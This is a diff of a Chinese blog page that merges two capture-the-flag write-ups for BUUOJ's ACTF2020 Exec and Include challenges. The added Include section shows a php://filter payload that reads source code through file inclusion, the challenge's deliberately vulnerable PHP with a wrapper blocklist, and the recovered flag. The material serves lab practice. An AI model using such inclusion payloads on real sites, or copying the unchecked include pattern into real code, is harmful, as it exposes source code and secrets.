@@ -81,8 +81,8 @@
 
 <meta name="description" content="buuoj">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ACTF2020_新生赛_Exec">
-<meta property="og:url" content="http://www.ethushiroha.com/buu_ACTF2020Exec.html">
+<meta property="og:title" content="ACTF2020">
+<meta property="og:url" content="http://www.ethushiroha.com/buu_ACTF2020.html">
 <meta property="og:site_name" content="stdout">
 <meta property="og:description" content="buuoj">
 <meta property="og:locale">
@@ -91,7 +91,7 @@
 <meta property="og:image" content="http://www.ethushiroha.com/[ACTF2020%20新生赛]Exec/image-20200809213701427.png">
 <meta property="og:image" content="http://www.ethushiroha.com/[ACTF2020%20新生赛]Exec/image-20200809213717018.png">
 <meta property="article:published_time" content="2020-08-09T13:30:20.000Z">
-<meta property="article:modified_time" content="2020-11-25T13:44:32.239Z">
+<meta property="article:modified_time" content="2020-12-03T03:01:19.454Z">
 <meta property="article:author" content="stdout">
 <meta property="article:tag" content="web">
 <meta property="article:tag" content="buu">
@@ -126,13 +126,13 @@
 
 
 
-  <link rel="canonical" href="http://www.ethushiroha.com/buu_ACTF2020Exec.html"/>
+  <link rel="canonical" href="http://www.ethushiroha.com/buu_ACTF2020.html"/>
 
 
 
 
 
-  <title>ACTF2020_新生赛_Exec | stdout</title>
+  <title>ACTF2020 | stdout</title>
   
 
 
@@ -227,12 +227,12 @@
         </li>
       
         
-        <li class="menu-item menu-item-友联">
+        <li class="menu-item menu-item-友链">
           <a href="/py.html" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
             
-            友联
+            友链
           </a>
         </li>
       
@@ -303,7 +303,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.ethushiroha.com/buu_ACTF2020Exec.html">
+    <link itemprop="mainEntityOfPage" href="http://www.ethushiroha.com/buu_ACTF2020.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="">
@@ -320,7 +320,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">ACTF2020_新生赛_Exec</h1>
+          <h1 class="post-title" itemprop="name headline">ACTF2020</h1>
         
 
         <div class="post-meta">
@@ -406,9 +406,7 @@
         <p><a href="%5Bhttps://buuoj.cn/challenges">buuoj</a></p>
 <a id="more"></a>
 
-
-
-<p>点进靶机界面如下</p>
+<h1 id="ACTF-2020-Exec"><a href="#ACTF-2020-Exec" class="headerlink" title="ACTF-2020-Exec"></a>ACTF-2020-Exec</h1><p>点进靶机界面如下</p>
 <img src="[ACTF2020 新生赛]Exec/image-20200809213540334.png" alt="image-20200809213540334" style="zoom:50%;" />
 
 <p>结合题目名，猜测是命令执行</p>
@@ -421,6 +419,22 @@
 <p>使用<code>cat</code>命令读取</p>
 <img src="[ACTF2020 新生赛]Exec/image-20200809213717018.png" alt="image-20200809213717018" style="zoom:50%;" />
 
+
+
+<h1 id="ACTF-2020-Include"><a href="#ACTF-2020-Include" class="headerlink" title="ACTF-2020-Include"></a>ACTF-2020-Include</h1><h2 id="Index-php"><a href="#Index-php" class="headerlink" title="Index.php"></a>Index.php</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset&#x3D;&quot;utf8&quot;&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;?file&#x3D;flag.php&quot;&gt;tips&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>结合题目名可以猜测是一个文件包含</p>
+<p>使用<code>php伪协议</code>读一下源码</p>
+<p><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code></p>
+<p>解码之后是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset&#x3D;&quot;utf8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">if(stristr($file,&quot;php:&#x2F;&#x2F;input&quot;) || stristr($file,&quot;zip:&#x2F;&#x2F;&quot;) || stristr($file,&quot;phar:&#x2F;&#x2F;&quot;) || stristr($file,&quot;data:&quot;))&#123;</span><br><span class="line">	exit(&#39;hacker!&#39;);</span><br><span class="line">&#125;</span><br><span class="line">if($file)&#123;</span><br><span class="line">	include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	echo &#39;&lt;a href&#x3D;&quot;?file&#x3D;flag.php&quot;&gt;tips&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h2><p>通过这个文件包含读一下<code>flag.php</code>的源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Can you find out the flag?&quot;;</span><br><span class="line">&#x2F;&#x2F;flag&#123;bfb0b1cd-426b-4590-9b3d-059c3b3cec96&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到了flag</p>
 
       
     </div>
@@ -453,8 +467,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/buu_ACTF2020Include.html" rel="next" title="ACTF2020_新生赛_Include">
-                <i class="fa fa-chevron-left"></i> ACTF2020_新生赛_Include
+              <a href="/buu_HCTF2018_WarmUp.html" rel="next" title="HCTF_2018_WarmUp">
+                <i class="fa fa-chevron-left"></i> HCTF_2018_WarmUp
               </a>
             
           </div>
@@ -517,8 +531,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -537,7 +560,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">56</span>
+                  <span class="site-state-item-count">53</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -592,6 +615,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ACTF-2020-Exec"><span class="nav-number">1.</span> <span class="nav-text">ACTF-2020-Exec</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ACTF-2020-Include"><span class="nav-number">2.</span> <span class="nav-text">ACTF-2020-Include</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Index-php"><span class="nav-number">2.1.</span> <span class="nav-text">Index.php</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flag-php"><span class="nav-number">2.2.</span> <span class="nav-text">flag.php</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
